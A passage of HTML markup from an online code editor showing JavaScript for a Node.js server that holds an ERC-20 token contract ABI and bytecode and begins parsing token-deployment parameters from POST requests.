class="cm-string">"bool"</span>}],<span class="cm-string cm-property">"payable"</span>:<span class="cm-atom">false</span>,<span class="cm-string cm-property">"stateMutability"</span>:<span class="cm-string">"nonpayable"</span>,<span class="cm-string cm-property">"type"</span>:<span class="cm-string">"function"</span>},{<span class="cm-string cm-property">"constant"</span>:<span class="cm-atom">true</span>,<span class="cm-string cm-property">"inputs"</span>:[],<span class="cm-string cm-property">"name"</span>:<span class="cm-string">"decimals"</span>,<span class="cm-string cm-property">"outputs"</span>:[{<span class="cm-string cm-property">"name"</span>:<span class="cm-string">""</span>,<span class="cm-string cm-property">"type"</span>:<span class="cm-string">"uint8"</span>}],<span class="cm-string cm-property">"payable"</span>:<span class="cm-atom">false</span>,<span class="cm-string cm-property">"stateMutability"</span>:<span class="cm-string">"view"</span>,<span class="cm-string cm-property">"type"</span>:<span class="cm-string">"function"</span>},{<span class="cm-string cm-property">"constant"</span>:<span class="cm-atom">false</span>,<span class="cm-string cm-property">"inputs"</span>:[{<span class="cm-string cm-property">"name"</span>:<span class="cm-string">"_spender"</span>,<span class="cm-string cm-property">"type"</span>:<span class="cm-string">"address"</span>},{<span class="cm-string cm-property">"name"</span>:<span class="cm-string">"_subtractedValue"</span>,<span class="cm-string cm-property">"type"</span>:<span class="cm-string">"uint256"</span>}],<span class="cm-string cm-property">"name"</span>:<span class="cm-string">"decreaseApproval"</span>,<span class="cm-string cm-property">"outputs"</span>:[{<span class="cm-string cm-property">"name"</span>:<span class="cm-string">""</span>,<span class="cm-string cm-property">"type"</span>:<span class="cm-string">"bool"</span>}],<span class="cm-string cm-property">"payable"</span>:<span class="cm-atom">false</span>,<span class="cm-string cm-property">"stateMutability"</span>:<span class="cm-string">"nonpayable"</span>,<span class="cm-string cm-property">"type"</span>:<span class="cm-string">"function"</span>},{<span class="cm-string cm-property">"constant"</span>:<span class="cm-atom">true</span>,<span class="cm-string cm-property">"inputs"</span>:[{<span class="cm-string cm-property">"name"</span>:<span class="cm-string">"_owner"</span>,<span class="cm-string cm-property">"type"</span>:<span class="cm-string">"address"</span>}],<span class="cm-string cm-property">"name"</span>:<span class="cm-string">"balanceOf"</span>,<span class="cm-string cm-property">"outputs"</span>:[{<span class="cm-string cm-property">"name"</span>:<span class="cm-string">""</span>,<span class="cm-string cm-property">"type"</span>:<span class="cm-string">"uint256"</span>}],<span class="cm-string cm-property">"payable"</span>:<span class="cm-atom">false</span>,<span class="cm-string cm-property">"stateMutability"</span>:<span class="cm-string">"view"</span>,<span class="cm-string cm-property">"type"</span>:<span class="cm-string">"function"</span>},{<span class="cm-string cm-property">"constant"</span>:<span class="cm-atom">true</span>,<span class="cm-string cm-property">"inputs"</span>:[],<span class="cm-string cm-property">"name"</span>:<span class="cm-string">"owner"</span>,<span class="cm-string cm-property">"outputs"</span>:[{<span class="cm-string cm-property">"name"</span>:<span class="cm-string">""</span>,<span class="cm-string cm-property">"type"</span>:<span class="cm-string">"address"</span>}],<span class="cm-string cm-property">"payable"</span>:<span class="cm-atom">false</span>,<span class="cm-string cm-property">"stateMutability"</span>:<span class="cm-string">"view"</span>,<span class="cm-string cm-property">"type"</span>:<span class="cm-string">"function"</span>},{<span class="cm-string cm-property">"constant"</span>:<span class="cm-atom">true</span>,<span class="cm-string cm-property">"inputs"</span>:[],<span class="cm-string cm-property">"name"</span>:<span class="cm-string">"symbol"</span>,<span class="cm-string cm-property">"outputs"</span>:[{<span class="cm-string cm-property">"name"</span>:<span class="cm-string">""</span>,<span class="cm-string cm-property">"type"</span>:<span class="cm-string">"string"</span>}],<span class="cm-string cm-property">"payable"</span>:<span class="cm-atom">false</span>,<span class="cm-string cm-property">"stateMutability"</span>:<span class="cm-string">"view"</span>,<span class="cm-string cm-property">"type"</span>:<span class="cm-string">"function"</span>},{<span class="cm-string cm-property">"constant"</span>:<span class="cm-atom">false</span>,<span class="cm-string cm-property">"inputs"</span>:[{<span class="cm-string cm-property">"name"</span>:<span class="cm-string">"_to"</span>,<span class="cm-string cm-property">"type"</span>:<span class="cm-string">"address"</span>},{<span class="cm-string cm-property">"name"</span>:<span class="cm-string">"_value"</span>,<span class="cm-string cm-property">"type"</span>:<span class="cm-string">"uint256"</span>}],<span class="cm-string cm-property">"name"</span>:<span class="cm-string">"transfer"</span>,<span class="cm-string cm-property">"outputs"</span>:[{<span class="cm-string cm-property">"name"</span>:<span class="cm-string">""</span>,<span class="cm-string cm-property">"type"</span>:<span class="cm-string">"bool"</span>}],<span class="cm-string cm-property">"payable"</span>:<span class="cm-atom">false</span>,<span class="cm-string cm-property">"stateMutability"</span>:<span class="cm-string">"nonpayable"</span>,<span class="cm-string cm-property">"type"</span>:<span class="cm-string">"function"</span>},{<span class="cm-string cm-property">"constant"</span>:<span class="cm-atom">false</span>,<span class="cm-string cm-property">"inputs"</span>:[{<span class="cm-string cm-property">"name"</span>:<span class="cm-string">"_spender"</span>,<span class="cm-string cm-property">"type"</span>:<span class="cm-string">"address"</span>},{<span class="cm-string cm-property">"name"</span>:<span class="cm-string">"_addedValue"</span>,<span class="cm-string cm-property">"type"</span>:<span class="cm-string">"uint256"</span>}],<span class="cm-string cm-property">"name"</span>:<span class="cm-string">"increaseApproval"</span>,<span class="cm-string cm-property">"outputs"</span>:[{<span class="cm-string cm-property">"name"</span>:<span class="cm-string">""</span>,<span class="cm-string cm-property">"type"</span>:<span class="cm-string">"bool"</span>}],<span class="cm-string cm-property">"payable"</span>:<span class="cm-atom">false</span>,<span class="cm-string cm-property">"stateMutability"</span>:<span class="cm-string">"nonpayable"</span>,<span class="cm-string cm-property">"type"</span>:<span class="cm-string">"function"</span>},{<span class="cm-string cm-property">"constant"</span>:<span class="cm-atom">true</span>,<span class="cm-string cm-property">"inputs"</span>:[{<span class="cm-string cm-property">"name"</span>:<span class="cm-string">"_owner"</span>,<span class="cm-string cm-property">"type"</span>:<span class="cm-string">"address"</span>},{<span class="cm-string cm-property">"name"</span>:<span class="cm-string">"_spender"</span>,<span class="cm-string cm-property">"type"</span>:<span class="cm-string">"address"</span>}],<span class="cm-string cm-property">"name"</span>:<span class="cm-string">"allowance"</span>,<span class="cm-string cm-property">"outputs"</span>:[{<span class="cm-string cm-property">"name"</span>:<span class="cm-string">""</span>,<span class="cm-string cm-property">"type"</span>:<span class="cm-string">"uint256"</span>}],<span class="cm-string cm-property">"payable"</span>:<span class="cm-atom">false</span>,<span class="cm-string cm-property">"stateMutability"</span>:<span class="cm-string">"view"</span>,<span class="cm-string cm-property">"type"</span>:<span class="cm-string">"function"</span>},{<span class="cm-string cm-property">"inputs"</span>:[{<span class="cm-string cm-property">"name"</span>:<span class="cm-string">"_initialSupply"</span>,<span class="cm-string cm-property">"type"</span>:<span class="cm-string">"uint256"</span>},{<span class="cm-string cm-property">"name"</span>:<span class="cm-string">"_tokenName"</span>,<span class="cm-string cm-property">"type"</span>:<span class="cm-string">"string"</span>},{<span class="cm-string cm-property">"name"</span>:<span class="cm-string">"_decimalUnits"</span>,<span class="cm-string cm-property">"type"</span>:<span class="cm-string">"uint8"</span>},{<span class="cm-string cm-property">"name"</span>:<span class="cm-string">"_tokenSymbol"</span>,<span class="cm-string cm-property">"type"</span>:<span class="cm-string">"string"</span>}],<span class="cm-string cm-property">"payable"</span>:<span class="cm-atom">false</span>,<span class="cm-string cm-property">"stateMutability"</span>:<span class="cm-string">"nonpayable"</span>,<span class="cm-string cm-property">"type"</span>:<span class="cm-string">"constructor"</span>},{<span class="cm-string cm-property">"anonymous"</span>:<span class="cm-atom">false</span>,<span class="cm-string cm-property">"inputs"</span>:[{<span class="cm-string cm-property">"indexed"</span>:<span class="cm-atom">true</span>,<span class="cm-string cm-property">"name"</span>:<span class="cm-string">"from"</span>,<span class="cm-string cm-property">"type"</span>:<span class="cm-string">"address"</span>},{<span class="cm-string cm-property">"indexed"</span>:<span class="cm-atom">true</span>,<span class="cm-string cm-property">"name"</span>:<span class="cm-string">"to"</span>,<span class="cm-string cm-property">"type"</span>:<span class="cm-string">"address"</span>},{<span class="cm-string cm-property">"indexed"</span>:<span class="cm-atom">false</span>,<span class="cm-string cm-property">"name"</span>:<span class="cm-string">"value"</span>,<span class="cm-string cm-property">"type"</span>:<span class="cm-string">"uint256"</span>}],<span class="cm-string cm-property">"name"</span>:<span class="cm-string">"Transfer"</span>,<span class="cm-string cm-property">"type"</span>:<span class="cm-string">"event"</span>},{<span class="cm-string cm-property">"anonymous"</span>:<span class="cm-atom">false</span>,<span class="cm-string cm-property">"inputs"</span>:[{<span class="cm-string cm-property">"indexed"</span>:<span class="cm-atom">true</span>,<span class="cm-string cm-property">"name"</span>:<span class="cm-string">"owner"</span>,<span class="cm-string cm-property">"type"</span>:<span class="cm-string">"address"</span>},{<span class="cm-string cm-property">"indexed"</span>:<span class="cm-atom">true</span>,<span class="cm-string cm-property">"name"</span>:<span class="cm-string">"spender"</span>,<span class="cm-string cm-property">"type"</span>:<span class="cm-string">"address"</span>},{<span class="cm-string cm-property">"indexed"</span>:<span class="cm-atom">false</span>,<span class="cm-string cm-property">"name"</span>:<span class="cm-string">"value"</span>,<span class="cm-string cm-property">"type"</span>:<span class="cm-string">"uint256"</span>}],<span class="cm-string cm-property">"name"</span>:<span class="cm-string">"Approval"</span>,<span class="cm-string cm-property">"type"</span>:<span class="cm-string">"event"</span>}]);</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span cm-text="">​</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-keyword">var</span> <span class="cm-def">standardtokenABI</span> <span class="cm-operator">=</span> <span class="cm-string">'0x608060405234801561001057600080fd5b50604051610bca380380610bca8339810160409081528151602080840151838501516060860151336000908152600585529586208590556003859055918601805194969095919492019261006792908601906100ab565b50805161007b9060019060208401906100ab565b50506002805460ff90921660ff19909216919091179055505060048054600160a060020a03191633179055610146565b828054600181600116156101000203166002900490600052602060002090601f016020900481019282601f106100ec57805160ff1916838001178555610119565b82800160010185558215610119579182015b828111156101195782518255916020019190600101906100fe565b50610125929150610129565b5090565b61014391905b80821115610125576000815560010161012f565b90565b610a75806101556000396000f3006080604052600436106100b95763ffffffff7c010000000000000000000000000000000000000000000000000000000060003504166306fdde0381146100be578063095ea7b31461014857806318160ddd1461018057806323b872dd146101a7578063313ce567146101d157806366188463146101fc57806370a08231146102205780638da5cb5b1461024157806395d89b4114610272578063a9059cbb14610287578063d73dd623146102ab578063dd62ed3e146102cf575b600080fd5b3480156100ca57600080fd5b506100d36102f6565b6040805160208082528351818301528351919283929083019185019080838360005b8381101561010d5781810151838201526020016100f5565b50505050905090810190601f16801561013a5780820380516001836020036101000a031916815260200191505b509250505060405180910390f35b34801561015457600080fd5b5061016c600160a060020a0360043516602435610384565b604080519115158252519081900360200190f35b34801561018c57600080fd5b506101956103ea565b60408051918252519081900360200190f35b3480156101b357600080fd5b5061016c600160a060020a03600435811690602435166044356103f0565b3480156101dd57600080fd5b506101e661066d565b6040805160ff9092168252519081900360200190f35b34801561020857600080fd5b5061016c600160a060020a0360043516602435610676565b34801561022c57600080fd5b50610195600160a060020a0360043516610765565b34801561024d57600080fd5b50610256610780565b60408051600160a060020a039092168252519081900360200190f35b34801561027e57600080fd5b506100d361078f565b34801561029357600080fd5b5061016c600160a060020a03600435166024356107e9565b3480156102b757600080fd5b5061016c600160a060020a0360043516602435610960565b3480156102db57600080fd5b50610195600160a060020a03600435811690602435166109f9565b6000805460408051602060026001851615610100026000190190941693909304601f8101849004840282018401909252818152929183018282801561037c5780601f106103515761010080835404028352916020019161037c565b820191906000526020600020905b81548152906001019060200180831161035f57829003601f168201915b505050505081565b336000818152600660209081526040808320600160a060020a038716808552908352818420869055815186815291519394909390927f8c5be1e5ebec7d5bd14f71427d1e84f3dd0314c0f7b2291e5b200ac8c7c3b925928290030190a350600192915050565b60035490565b600160a060020a038316600090815260056020526040812054821115610460576040805160e560020a62461bcd02815260206004820152601f60248201527f66726f6d27732062616c616e636520697320756e73756666696369656e742e00604482015290519081900360640190fd5b600160a060020a0384166000908152600660209081526040808320338452909152902054821115610500576040805160e560020a62461bcd028152602060048201526024808201527f76616c756520746f206265207472616e73666572656420697320756e6170707260448201527f6f76656400000000000000000000000000000000000000000000000000000000606482015290519081900360840190fd5b600160a060020a0383161515610560576040805160e560020a62461bcd02815260206004820152601760248201527f746f2773206164647265737320697320696e76616c6964000000000000000000604482015290519081900360640190fd5b600160a060020a038416600090815260056020526040902054610589908363ffffffff610a2416565b600160a060020a0380861660009081526005602052604080822093909355908516815220546105be908363ffffffff610a3616565b600160a060020a038085166000908152600560209081526040808320949094559187168152600682528281203382529091522054610602908363ffffffff610a2416565b600160a060020a03808616600081815260066020908152604080832033845282529182902094909455805186815290519287169391927fddf252ad1be2c89b69c2b068fc378daa952ba7f163c4a11628f55a4df523b3ef929181900390910190a35060019392505050565b60025460ff1681565b336000908152600660209081526040808320600160a060020a03861684529091528120548083106106ca57336000908152600660209081526040808320600160a060020a03881684529091528120556106ff565b6106da818463ffffffff610a2416565b336000908152600660209081526040808320600160a060020a03891684529091529020555b336000818152600660209081526040808320600160a060020a0389168085529083529281902054815190815290519293927f8c5be1e5ebec7d5bd14f71427d1e84f3dd0314c0f7b2291e5b200ac8c7c3b925929181900390910190a35060019392505050565b600160a060020a031660009081526005602052604090205490565b600454600160a060020a031681565b60018054604080516020600284861615610100026000190190941693909304601f8101849004840282018401909252818152929183018282801561037c5780601f106103515761010080835404028352916020019161037c565b33600090815260056020526040812054821115610850576040805160e560020a62461bcd02815260206004820152601860248201527f62616c616e636520697320756e73756666696369656e742e0000000000000000604482015290519081900360640190fd5b600160a060020a03831615156108b0576040805160e560020a62461bc</span><span class="cm-string">d02815260206004820152601a60248201527f746172676574206164647265737320697320696e76616c69642e000000000000604482015290519081900360640190fd5b336000908152600560205260409020546108d0908363ffffffff610a2416565b3360009081526005602052604080822092909255600160a060020a03851681522054610902908363ffffffff610a3616565b600160a060020a0384166000818152600560209081526040918290209390935580518581529051919233927fddf252ad1be2c89b69c2b068fc378daa952ba7f163c4a11628f55a4df523b3ef9281900390910190a350600192915050565b336000908152600660209081526040808320600160a060020a0386168452909152812054610994908363ffffffff610a3616565b336000818152600660209081526040808320600160a060020a0389168085529083529281902085905580519485525191937f8c5be1e5ebec7d5bd14f71427d1e84f3dd0314c0f7b2291e5b200ac8c7c3b925929081900390910190a350600192915050565b600160a060020a03918216600090815260066020908152604080832093909416825291909152205490565b600082821115610a3057fe5b50900390565b81810182811015610a4357fe5b929150505600a165627a7a723058206cb3f3c3ad6606c63a33018a09e2fda800ac506cc90340b9f23dec2e9b2048660029'</span>;</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span cm-text="">​</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-variable">http</span>.<span class="cm-property">createServer</span>(<span class="cm-keyword">function</span>(<span class="cm-def">req</span>, <span class="cm-def">res</span>) {</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-tab" role="presentation" cm-text="	">    </span><span class="cm-keyword">var</span> <span class="cm-def">postData</span> <span class="cm-operator">=</span> <span class="cm-string">''</span>;</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-tab" role="presentation" cm-text="	">    </span><span class="cm-variable-2">req</span>.<span class="cm-property">setEncoding</span>(<span class="cm-string">'utf-8'</span>);</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-tab" role="presentation" cm-text="	">    </span><span class="cm-variable-2">req</span>.<span class="cm-property">addListener</span>(<span class="cm-string">"data"</span>, <span class="cm-keyword">function</span> (<span class="cm-def">postDataChunk</span>) {</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-tab" role="presentation" cm-text="	">    </span><span class="cm-tab" role="presentation" cm-text="	">    </span><span class="cm-variable-2">postData</span> <span class="cm-operator">+=</span> <span class="cm-variable-2">postDataChunk</span>;</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-tab" role="presentation" cm-text="	">    </span>});</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-tab" role="presentation" cm-text="	">    </span><span class="cm-variable-2">req</span>.<span class="cm-property">addListener</span>(<span class="cm-string">"end"</span>, <span class="cm-keyword">function</span> () {</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-tab" role="presentation" cm-text="	">    </span><span class="cm-tab" role="presentation" cm-text="	">    </span><span class="cm-keyword">var</span> <span class="cm-def">params</span>;</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-tab" role="presentation" cm-text="	">    </span><span class="cm-tab" role="presentation" cm-text="	">    </span><span class="cm-keyword">try</span> {</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-tab" role="presentation" cm-text="	">    </span><span class="cm-tab" role="presentation" cm-text="	">    </span><span class="cm-tab" role="presentation" cm-text="	">    </span><span class="cm-variable-2">params</span> <span class="cm-operator">=</span> <span class="cm-variable">JSON</span>.<span class="cm-property">parse</span>(<span class="cm-variable-2">postData</span>);</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-tab" role="presentation" cm-text="	">    </span><span class="cm-tab" role="presentation" cm-text="	">    </span>} <span class="cm-keyword">catch</span>(<span class="cm-def">e</span>) {</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-tab" role="presentation" cm-text="	">    </span><span class="cm-tab" role="presentation" cm-text="	">    </span><span class="cm-tab" role="presentation" cm-text="	">    </span><span class="cm-variable-2">res</span>.<span class="cm-property">writeHead</span>(<span class="cm-number">200</span>, {<span class="cm-string cm-property">'Content-Type'</span>: <span class="cm-string">'application/json'</span>});</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-tab" role="presentation" cm-text="	">    </span><span class="cm-tab" role="presentation" cm-text="	">    </span><span class="cm-tab" role="presentation" cm-text="	">    </span><span class="cm-keyword">var</span> <span class="cm-def">body</span> <span class="cm-operator">=</span> <span class="cm-string">'{"error": -1, "errMsg": "failed to parse request data."'</span>;</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-tab" role="presentation" cm-text="	">    </span><span class="cm-tab" role="presentation" cm-text="	">    </span><span class="cm-tab" role="presentation" cm-text="	">    </span><span class="cm-variable-2">res</span>.<span class="cm-property">write</span>(<span class="cm-variable-2">body</span>);</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-tab" role="presentation" cm-text="	">    </span><span class="cm-tab" role="presentation" cm-text="	">    </span><span class="cm-tab" role="presentation" cm-text="	">    </span><span class="cm-variable-2">res</span>.<span class="cm-property">end</span>();</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span cm-text="">​</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-tab" role="presentation" cm-text="	">    </span><span class="cm-tab" role="presentation" cm-text="	">    </span><span class="cm-tab" role="presentation" cm-text="	">    </span><span class="cm-variable">console</span>.<span class="cm-property">log</span>(<span class="cm-string">"url: "</span>, <span class="cm-variable-2">req</span>.<span class="cm-property">url</span>, <span class="cm-string">", method: "</span>, <span class="cm-variable-2">req</span>.<span class="cm-property">method</span>,</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-tab" role="presentation" cm-text="	">    </span><span class="cm-tab" role="presentation" cm-text="	">    </span><span class="cm-tab" role="presentation" cm-text="	">    </span><span class="cm-tab" role="presentation" cm-text="	">    </span><span class="cm-string">", params: "</span>, <span class="cm-variable-2">params</span>);</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span cm-text="">​</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-tab" role="presentation" cm-text="	">    </span><span class="cm-tab" role="presentation" cm-text="	">    </span><span class="cm-tab" role="presentation" cm-text="	">    </span><span class="cm-keyword">return</span>;</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-tab" role="presentation" cm-text="	">    </span><span class="cm-tab" role="presentation" cm-text="	">    </span>}</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span cm-text="">​</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-tab" role="presentation" cm-text="	">    </span><span class="cm-tab" role="presentation" cm-text="	">    </span><span class="cm-keyword">var</span> <span class="cm-def">initialSupply</span> <span class="cm-operator">=</span> <span class="cm-variable-2">params</span>.<span class="cm-property">initialSupply</span>;</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-tab" role="presentation" cm-text="	">    </span><span class="cm-tab" role="presentation" cm-text="	">    </span><span class="cm-keyword">var</span> <span class="cm-def">tokenName</span> <span class="cm-operator">=</span> <span class="cm-variable-2">params</span>.<span class="cm-property">tokenName</span>;</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-tab" role="presentation" cm-text="	">    </span><span class="cm-tab" role="presentation" cm-text="	">    </span><span class="cm-keyword">var</span> <span class="cm-def">decimalUnits</span> <span class="cm-operator">=</span> <span class="cm-variable-2">params</span>.<span class="cm-property">decimalUnits</span>;</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-tab" role="presentation" cm-text="	">    </span><span class="cm-tab" role="presentation" cm-text="	">    </span><span class="cm-keyword">var</span> <span class="cm-def">tokenSymbol</span> <span class="cm-operator">=</span> <span class="cm-variable-2">params</span>.<span class="cm-property">tokenSymbol</span>;</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span cm-text="">​</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-tab" role="presentation" cm-text="	">    </span><span class="cm-tab" role="presentation" cm-text="	">    </span><span class="cm-keyword">if</span> (<span class="cm-keyword">typeof</span> <span class="cm-variable-2">initialSupply</span> <span class="cm-operator">===</span> <span class="cm-string">'undefined'</span> <span class="cm-operator">||</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-tab" role="presentation" cm-text="	">    </span><span class="cm-tab" role="presentation" cm-text="	">    </span><span class="cm-tab" role="presentation" cm-text="	">    </span><span class="cm-keyword">typeof</span> <span class="cm-variable-2">tokenName</span> <span class="cm-operator">===</span> <span class="cm-string">'undefined'</span> <span class="cm-operator">||</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-tab" role="presentation" cm-text="	">    </span><span class="cm-tab" role="presentation" cm-text="	">    </span><span class="cm-tab" role="presentation" cm-text="	">    </span><span class="cm-keyword">typeof</span> <span class="cm-variable-2">decimalUnits</span> <span class="cm-operator">===</span> <span class="cm-string">'undefined'</span> <span class="cm-operator">||</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-tab" role="presentation" cm-text="	">    </span><span class="cm-tab" role="presentation" cm-text="	">    </span><span class="cm-tab" role="presentation" cm-text="	">    </span><span class="cm-keyword">typeof</span> <span class="cm-variable-2">tokenSymbol</span> <span class="cm-operator">===</span> <span class="cm-string">'undefined'</span>) {</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-tab" role="presentation" cm-text="	">    </span><span class="cm-tab" role="presentation" cm-text="	">    </span><span class="cm-tab" role="presentation" cm-text="	">    </span><span class="cm-variable-2">res</span>.<span class="cm-property">writeHead</span>(<span class="cm-number">200</span>, {<span class="cm-string cm-property">'Content-Type'</span>: <span class="cm-string">'application/json'</span>});</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-tab" role="presentation" cm-text="	">    </span><span class="cm-tab" role="presentation" cm-text="	">    </span><span class="cm-tab" role="presentation" cm-text="	">    </span><span class="cm-keyword">var</span> <span class="cm-def">body</span> <span class="cm-operator">=</span> <span class="cm-string">'{"error": -2, "errMsg": "failed to validate params."'</span>;</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-tab" role="presentation" cm-text="	">    </span><span class="cm-tab" role="presentation" cm-text="	">    </span><span class="cm-tab" role="presentation" cm-text="	">    </span><span class="cm-variable-2">res</span>.<span class="cm-property">write</span>(<span class="cm-variable-2">body</span>);</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-tab" role="presentation" cm-text="	">    </span><span class="cm-tab" role="presentation" cm-text="	">    </span><span class="cm-tab" role="presentation" cm-text="	">    </span><span class="cm-variable-2">res</span>.<span class="cm-property">end</span>();</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span cm-text="">​</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-tab" role="presentation" cm-text="	">    </span><span class="cm-tab" role="presentation" cm-text="	">    </span><span class="cm-tab" role="presentation" cm-text="	">    </span><span class="cm-variable">console</span>.<span class="cm-property">log</span>(<span class="cm-string">"initialSupply: "</span>, <span class="cm-variable-2">initialSupply</span>, <span class="cm-string">", "</span>,</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-tab" role="presentation" cm-text="	">    </span><span class="cm-tab" role="presentation" cm-text="	">    </span><span class="cm-tab" role="presentation" cm-text="	">    </span><span class="cm-tab" role="presentation" cm-text="	">    </span><span class="cm-string">"tokenName: "</span>, <span class="cm-variable-2">tokenName</span>, <span class="cm-string">", "</span>,</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-tab" role="presentation" cm-text="	">    </span><span class="cm-tab" role="presentation" cm-text="	">    </span><span class="cm-tab" role="presentation" cm-text="	">    </span><span class="cm-tab" role="presentation" cm-text="	">    </span><span class="cm-string">"decimalUnits: "</span>, <span class="cm-variable-2">decimalUnits</span>, <span class="cm-string">", "</span>,</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-tab" role="presentation" cm-text="	">    </span><span class="cm-tab" role="presentation" cm-text="	">    </span><span class="cm-tab" role="presentation" cm-text="	">    </span><span class="cm-tab" role="presentation" cm-text="	">    </span><span class="cm-string">"tokenSymbol: "</span>, <span class="cm-variable-2">tokenSymbol</span>);</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span cm-text="">​</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-tab" role="presentation" cm-text="	">    </span><span class="cm-tab" role="presentation" cm-text="	">    </span><span class="cm-tab" role="presentation" cm-text="	">    </span><span class="cm-keyword">return</span>;</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-tab" role="presentation" cm-text="	">    </span><span class="cm-tab" role="presentation" cm-text="	">    </span>}</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span cm-text="">​</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-tab" role="presentation" cm-text="	">    </span><span class="cm-tab" role="presentation" cm-text="	">    </span><span class="cm-variable">console</span>.<span class="cm-property">log</span>(<span class="cm-string">"+++ initialSupply: "</span>, <span class="cm-variable-2">initialSupply</span>, <span class="cm-string">", "</span>,</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-tab" role="presentation" cm-text="	">    </span><span class="cm-tab" role="presentation" cm-text="	">    </span><span class="cm-tab" role="presentation" cm-text="	">    </span><span class="cm-string">"tokenName: "</span>, <span class="cm-variable-2">tokenName</span>, <span class="cm-string">", "</span>,</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-tab" role="presentation" cm-text="	">    </span><span class="cm-tab" role="presentation" cm-text="	">    </span><span class="cm-tab" role="presentation" cm-text="	">    </span><span class="cm-string">"decimalUnits: "</span>, <span class="cm-variable-2">decimalUnits</span>, <span class="cm-string">", "</span>,</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-tab" role="presentation" cm-text="	">    </span><span class="cm-tab" role="presentation" cm-text="	">    </span><span class="cm-tab" role="presentation" cm-text="	">    </span><span class="cm-string">"tokenSymbol: "</span>, <span class="cm-variable-2">tokenSymbol</span>);</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span cm-text="">​</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 